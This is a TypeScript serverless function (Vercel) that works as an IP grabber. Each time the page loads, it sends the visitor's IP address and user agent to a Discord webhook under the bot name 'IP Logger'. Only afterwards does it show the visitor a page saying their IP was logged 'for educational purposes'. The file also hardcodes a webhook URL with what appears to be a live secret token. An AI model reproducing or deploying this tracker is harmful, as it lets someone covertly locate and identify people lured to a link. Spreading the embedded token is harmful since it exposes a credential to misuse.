// File: /api/index.ts

import { VercelRequest, VercelResponse } from '@vercel/node';
import { WebhookClient, EmbedBuilder } from 'discord.js';

// IMPORTANT: Replace this with your actual Discord Webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455249506844016811/ws8UVleB2RoXpzozn0dqgfv3hZmRGRu8gWFT1Qo09OJzPmUquYNHeBFok6rvu0d_3Rn1';

// Initialize the Discord Webhook Client
const webhook = new WebhookClient({ url: WEBHOOK_URL });

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // Get the IP address from the request. Vercel makes this easy.
  const ip = req.ip || 'Unknown';

  // --- 1. Send message to Discord Webhook ---
  try {
    const embed = new EmbedBuilder()
      .setColor(0x0099FF) // A nice blue color
      .setTitle('📍 New Visitor Detected!')
      .addFields(
        { name: 'IP Address', value: `\`${ip}\``, inline: true },
        { name: 'User Agent', value: `\`${req.headers['user-agent'] || 'N/A'}\``, inline: false }
      )
      .setTimestamp();

    await webhook.send({
      username: 'IP Logger',
      avatarURL: 'https://i.imgur.com/4M34hi2.png', // A generic avatar
      embeds: [embed],
    });
  } catch (error) {
    // If sending to Discord fails, we'll log it but still show the page to the user.
    console.error('Failed to send Discord webhook:', error);
  }

  // --- 2. Return an HTML page to the visitor ---
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>IP Check</title>
        <style>
            body {
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                background-color: #f0f2f5;
                color: #333;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                padding: 20px;
                box-sizing: border-box;
            }
            .card {
                background-color: white;
                padding: 40px;
                border-radius: 12px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
                text-align: center;
                max-width: 500px;
                width: 100%;
            }
            h1 {
                margin-top: 0;
                color: #1a1a1a;
            }
            p {
                font-size: 1.1rem;
                line-height: 1.6;
            }
            .ip-value {
                font-weight: bold;
                color: #0070f3;
                background-color: #eef7ff;
                padding: 10px 15px;
                border-radius: 6px;
                word-break: break-all;
                font-family: 'Courier New', Courier, monospace;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>Your IP Address</h1>
            <p>For educational purposes, we have detected your IP address and sent it to a secure log.</p>
            <p class="ip-value">${ip}</p>
        </div>
    </body>
    </html>
  `;

  // Set the content type to HTML and send the response
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(htmlContent);
}
